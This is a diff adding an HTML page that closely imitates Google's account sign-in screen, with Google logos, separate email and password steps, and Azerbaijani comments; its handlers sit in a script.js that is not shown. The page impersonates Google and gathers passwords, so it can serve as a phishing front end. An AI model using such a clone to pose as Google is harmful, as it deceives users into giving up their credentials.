@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="header-logo">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92">
+      <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+      <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+      <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+      <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 35.29.36 16.69 16.32 1.23 35.29 1.23c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65H35.29z"/>
+    </svg>
+  </div>
+  <div class="header-right">
+    <button class="btn-text" onclick="handleHelp(event)">Help</button>
+  </div>
+</header>
+
+<!-- MAIN -->
+<main>
+  <div class="card">
+
+    <!-- Google "G" loqosu -->
+    <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      <path fill="none" d="M0 0h48v48H0z"/>
+    </svg>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">Use your Google Account</p>
+
+    <!-- ADDIM 1: Email -->
+    <div id="step-email" class="active">
+
+      <div class="input-group">
+        <input type="email" id="emailInput" placeholder=" " autocomplete="email"/>
+        <label for="emailInput">Email or phone</label>
+      </div>
+
+      <div class="error-msg" id="emailError">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+        <span id="emailErrorText">Enter an email or phone number</span>
+      </div>
+
+      <p class="info-link-row">
+        <a href="#" onclick="handleForgotEmail(event)">Forgot email?</a>
+      </p>
+
+      <p class="info-link-row" style="line-height:1.6;">
+        Not your computer? Use Guest mode to sign in privately.
+        <a href="#" onclick="handleLearnMore(event)">Learn more</a>
+      </p>
+
+      <div class="bottom-row">
+        <button class="btn-create" onclick="handleCreateAccount(event)">Create account</button>
+        <button class="btn-next" onclick="handleEmailNext()">Next</button>
+      </div>
+
+    </div>
+
+    <!-- ADDIM 2: Şifrə -->
+    <div id="step-password">
+
+      <div class="email-display" id="emailBadge" onclick="goBackToEmail()">
+        <div class="avatar" id="avatarLetter">A</div>
+        <span id="badgeEmail">user@gmail.com</span>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
+          <path d="M7 10l5 5 5-5z"/>
+        </svg>
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="passwordInput" placeholder=" " autocomplete="current-password"/>
+        <label for="passwordInput">Enter your password</label>
+      </div>
+
+      <div class="error-msg" id="pwError">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+        <span>Wrong password. Try again or click Forgot password to reset it.</span>
+      </div>
+
+      <div class="show-pw-row" onclick="toggleShowPw(this)">
+        <input type="checkbox" id="showPwCheck"/>
+        <span>Show password</span>
+      </div>
+
+      <div class="bottom-row">
+        <a href="#" class="forgot-link" onclick="handleForgotPassword(event)">Forgot password?</a>
+        <button class="btn-next" onclick="handlePasswordNext()">Next</button>
+      </div>
+
+    </div>
+
+  </div>
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-lang">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
+      <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.9 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.66-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/>
+    </svg>
+    <select>
+      <option>English (United States)</option>
+      <option>Azerbaijani</option>
+      <option>Deutsch</option>
+      <option>Español</option>
+      <option>Français</option>
+      <option>Русский</option>
+      <option>Türkçe</option>
+    </select>
+  </div>
+  <div class="footer-links">
+    <a href="#" onclick="handleHelp(event)">Help</a>
+    <a href="#" onclick="handlePrivacy(event)">Privacy</a>
+    <a href="#" onclick="handleTerms(event)">Terms</a>
+  </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
